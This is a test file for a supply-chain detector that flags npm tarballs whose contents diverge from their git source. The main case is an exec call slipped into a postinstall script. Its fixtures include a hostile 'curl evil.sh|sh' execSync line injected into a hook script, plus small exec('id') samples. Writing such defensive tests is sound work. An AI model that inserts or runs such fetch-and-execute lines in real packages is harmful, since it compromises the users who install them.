import { test } from 'node:test';
import assert from 'assert/strict';
import {
  compareTarballToGit,
  parseRepository,
  candidateRefs,
  contentHash,
  normalizeEntryPath,
  sensitiveNodes,
  ERR_TARBALL_GIT_DESYNC,
} from '../backend/validators/git-diff.js';
import { scan as d31 } from '../backend/detectors/tier1-tarball-git-desync.js';
import { runAll } from '../backend/detectors/index.js';

const PKG = {
  name: 'payment-sdk',
  version: '3.2.0',
  repository: { url: 'git+https://github.com/acme/payment-sdk.git' },
  scripts: { postinstall: 'node scripts/setup.js' },
  bin: { 'payment-sdk': './bin/cli.js' },
};
const META = { gitHead: 'a'.repeat(40), version: '3.2.0' };

const CLEAN_INDEX = 'export function pay(){ return 1; }\n';
const CLEAN_SETUP = 'console.log("setup");\n';
const CLEAN_CLI = '#!/usr/bin/env node\nrequire("../index.js");\n';

const SOURCE = new Map([
  ['index.js', CLEAN_INDEX],
  ['scripts/setup.js', CLEAN_SETUP],
  ['bin/cli.js', CLEAN_CLI],
]);

const provider = async () => SOURCE;
const tar = (entries) => entries.map(([path, content]) => ({ path: 'package/' + path, content }));
const BASE = [
  ['index.js', CLEAN_INDEX],
  ['scripts/setup.js', CLEAN_SETUP],
  ['bin/cli.js', CLEAN_CLI],
];

const compare = (entries, opts = {}) =>
  compareTarballToGit(PKG, tar(entries), META, {
    enabled: true,
    sourceProvider: provider,
    ...opts,
  });

/* ------------------------------------------------------------------ *
 * G2.1 — the ChainDrop scenario                                       *
 * ------------------------------------------------------------------ */

test('git-diff: a tarball matching its git source is clean', async () => {
  const r = await compare(BASE);
  assert.equal(r.status, 'clean');
  assert.equal(r.findings.length, 0);
  assert.equal(r.compared, 3);
});

test('git-diff: uncommitted patch adding exec to a hook script is a critical desync (G2.1)', async () => {
  const r = await compare([
    ['index.js', CLEAN_INDEX],
    ['scripts/setup.js', CLEAN_SETUP + 'require("child_process").execSync("curl evil.sh|sh");\n'],
    ['bin/cli.js', CLEAN_CLI],
  ]);
  assert.equal(r.status, 'desync');
  assert.equal(r.findings.length, 1);
  assert.equal(r.findings[0].kind, 'sensitive_nodes_added');
  assert.equal(r.findings[0].severity, 'critical');
  assert.equal(r.findings[0].path, 'scripts/setup.js');
  assert.ok(r.findings[0].capabilities.some((c) => c.capability === 'exec'));
});

test('git-diff: an executable file absent from git entirely is a critical desync', async () => {
  const r = await compare([
    ...BASE,
    ['scripts/postinstall-helper.js', 'require("child_process").exec("id");\n'],
  ]);
  assert.equal(r.status, 'desync');
  assert.equal(r.findings[0].kind, 'absent_from_source');
  assert.equal(r.findings[0].severity, 'critical');
});

test('git-diff: a declared bin script absent from git is a critical desync', async () => {
  const source = new Map([
    ['index.js', CLEAN_INDEX],
    ['scripts/setup.js', CLEAN_SETUP],
  ]);
  const r = await compareTarballToGit(PKG, tar(BASE), META, {
    enabled: true,
    sourceProvider: async () => source,
  });
  assert.equal(r.status, 'desync');
  assert.ok(r.findings.some((x) => x.path === 'bin/cli.js' && x.severity === 'critical'));
});

/* ------------------------------------------------------------------ *
 * False-positive guards — the calibration that makes this usable      *
 * ------------------------------------------------------------------ */

test('git-diff: reformatting a tracked file does not fire', async () => {
  const r = await compare([
    ['index.js', 'export function pay() {\n  return 1;\n}\n'],
    ['scripts/setup.js', CLEAN_SETUP],
    ['bin/cli.js', CLEAN_CLI],
  ]);
  assert.equal(r.status, 'clean');
});

test('git-diff: CRLF and trailing whitespace differences do not fire', async () => {
  const r = await compare([
    ['index.js', CLEAN_INDEX.replace(/\n/g, '\r\n').replace('1;', '1;   ')],
    ['scripts/setup.js', CLEAN_SETUP],
    ['bin/cli.js', CLEAN_CLI],
  ]);
  assert.equal(r.status, 'clean');
});

test('git-diff: build output absent from git is skipped, not flagged', async () => {
  const r = await compare([
    ...BASE,
    ['dist/bundle.js', 'require("child_process").exec("id");\n'],
    ['dist/bundle.min.js', 'x'],
  ]);
  assert.equal(r.status, 'clean');
  assert.ok(r.skipped >= 2, 'generated files should be counted as skipped');
});

test('git-diff: package.json and docs are never diffed', async () => {
  const r = await compare([
    ...BASE,
    ['package.json', '{"name":"different"}'],
    ['README.md', 'totally different readme'],
  ]);
  assert.equal(r.status, 'clean');
});

/* ------------------------------------------------------------------ *
 * Source resolution                                                   *
 * ------------------------------------------------------------------ */

test('git-diff: parseRepository handles every npm repository form', () => {
  for (const form of [
    'git+https://github.com/acme/payment-sdk.git',
    'git@github.com:acme/payment-sdk.git',
    'https://github.com/acme/payment-sdk',
    'ssh://git@github.com/acme/payment-sdk.git',
    'acme/payment-sdk',
  ]) {
    const parsed = parseRepository(form);
    assert.ok(parsed, `failed to parse ${form}`);
    assert.equal(parsed.owner, 'acme');
    assert.equal(parsed.repo, 'payment-sdk');
  }
  assert.equal(parseRepository(''), null);
  assert.equal(parseRepository(null), null);
});

test('git-diff: candidate refs prefer the attested commit over the declared head', () => {
  const refs = candidateRefs(PKG, META, { sourceCommit: 'b'.repeat(40) });
  assert.equal(refs[0].source, 'attestation_git_commit');
  assert.equal(refs[1].source, 'registry_git_head');
  assert.ok(refs.some((r) => r.ref === 'v3.2.0'));
});

test('git-diff: falls back through candidate refs until one resolves', async () => {
  const tried = [];
  const r = await compareTarballToGit(PKG, tar(BASE), META, {
    enabled: true,
    sourceProvider: async ({ ref }) => {
      tried.push(ref);
      return ref === 'v3.2.0' ? SOURCE : null;
    },
  });
  assert.equal(r.status, 'clean');
  assert.equal(r.source.ref, 'v3.2.0');
  assert.ok(tried.length >= 2, 'should have tried earlier refs first');
});

test('git-diff: normalizeEntryPath strips the archive root segment', () => {
  assert.equal(normalizeEntryPath('package/index.js'), 'index.js');
  assert.equal(normalizeEntryPath('payment-sdk-3.2.0/src/a.js'), 'src/a.js');
  assert.equal(normalizeEntryPath('index.js', { stripRoot: false }), 'index.js');
});

test('git-diff: contentHash is insensitive to line endings and trailing space', () => {
  assert.equal(contentHash('a\nb\n'), contentHash('a\r\nb\r\n'));
  assert.equal(contentHash('a  \nb'), contentHash('a\nb'));
  assert.notEqual(contentHash('a'), contentHash('b'));
});

test('git-diff: sensitiveNodes finds capability across runtimes and inline requires', () => {
  const caps = (src) => sensitiveNodes(src).map((c) => c.capability);
  assert.ok(caps('require("child_process").execSync("id")').includes('exec'));
  assert.ok(caps('const cp=require("child_process"); cp.exec("id")').includes('exec'));
  assert.ok(caps('await Bun.$`id`').includes('exec'));
  assert.ok(caps('new Deno.Command("id")').includes('exec'));
  assert.ok(caps('Deno.dlopen("libc.so",{})').includes('ffi'));
  assert.deepEqual(sensitiveNodes('export const add = (a,b) => a+b;'), []);
});

/* ------------------------------------------------------------------ *
 * Unverifiable is never silently clean                                *
 * ------------------------------------------------------------------ */

test('git-diff: unreachable source reports unverifiable, not clean', async () => {
  const r = await compareTarballToGit(PKG, tar(BASE), META, {
    enabled: true,
    sourceProvider: async () => null,
  });
  assert.equal(r.status, 'unverifiable');
  assert.equal(r.reason, 'source_unavailable');
});

test('git-diff: a package with no repository field is unverifiable', async () => {
  const r = await compareTarballToGit(
    { name: 'x', version: '1.0.0' },
    tar(BASE),
    {},
    {
      enabled: true,
      sourceProvider: provider,
    }
  );
  assert.equal(r.status, 'unverifiable');
  assert.equal(r.reason, 'no_repository_declared');
});

/* ------------------------------------------------------------------ *
 * Detector wrapper                                                    *
 * ------------------------------------------------------------------ */

const DESYNC_FILES = tar([
  ['index.js', CLEAN_INDEX],
  ['scripts/setup.js', CLEAN_SETUP + 'require("child_process").execSync("curl evil.sh|sh");\n'],
  ['bin/cli.js', CLEAN_CLI],
]);

test('D31: emits ERR_TARBALL_GIT_DESYNC at critical', async () => {
  const findings = await d31(PKG, [], META, DESYNC_FILES, {
    enabled: true,
    sourceProvider: provider,
  });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, ERR_TARBALL_GIT_DESYNC);
  assert.equal(findings[0].id, 'ERR_TARBALL_GIT_DESYNC');
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].recommendation.startsWith('BLOCK'));
});

test('D31: reports the source ref it compared against', async () => {
  const [finding] = await d31(PKG, [], META, DESYNC_FILES, {
    enabled: true,
    sourceProvider: provider,
  });
  assert.equal(finding.context.git_diff_status, 'desync');
  assert.equal(finding.context.source_repo, 'https://github.com/acme/payment-sdk');
  assert.equal(finding.context.ref_source, 'registry_git_head');
  assert.equal(finding.context.desync_files[0].path, 'scripts/setup.js');
});

test('D31: fires regardless of valid OIDC provenance', async () => {
  // The whole point: a genuine attestation over a dirty build is the attack,
  // so provenance must never suppress this finding.
  const withProvenance = await d31(
    PKG,
    [],
    { ...META, dist: { attestations: [{ predicateType: 'https://slsa.dev/provenance/v1' }] } },
    DESYNC_FILES,
    { enabled: true, sourceProvider: provider, provenance: { verified: true, slsaLevel: 3 } }
  );
  assert.equal(withProvenance.length, 1);
  assert.equal(withProvenance[0].severity, 'critical');
});

test('D31: disabled performs no I/O at all', async () => {
  let called = false;
  const findings = await d31(PKG, [], META, DESYNC_FILES, {
    enabled: false,
    sourceProvider: async () => {
      called = true;
      return SOURCE;
    },
  });
  assert.deepEqual(findings, []);
  assert.equal(called, false, 'source provider must not be called when disabled');
});

test('D31: is off by default in the full pipeline', async () => {
  const findings = await runAll(PKG, [], META, DESYNC_FILES);
  assert.ok(!findings.some((x) => x.id === ERR_TARBALL_GIT_DESYNC));
});

test('D31: can be enabled through runAll options', async () => {
  const findings = await runAll(PKG, [], META, DESYNC_FILES, {
    gitDiff: { enabled: true, sourceProvider: provider },
  });
  assert.ok(findings.some((x) => x.id === ERR_TARBALL_GIT_DESYNC));
});

test('D31: unverifiable source produces an informational finding', async () => {
  const findings = await d31(PKG, [], META, DESYNC_FILES, {
    enabled: true,
    sourceProvider: async () => null,
  });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'low');
  assert.ok(findings[0].evidence.some((e) => e.includes('not evidence')));
});

test('D31: a clean comparison produces no finding', async () => {
  const findings = await d31(PKG, [], META, tar(BASE), {
    enabled: true,
    sourceProvider: provider,
  });
  assert.deepEqual(findings, []);
});
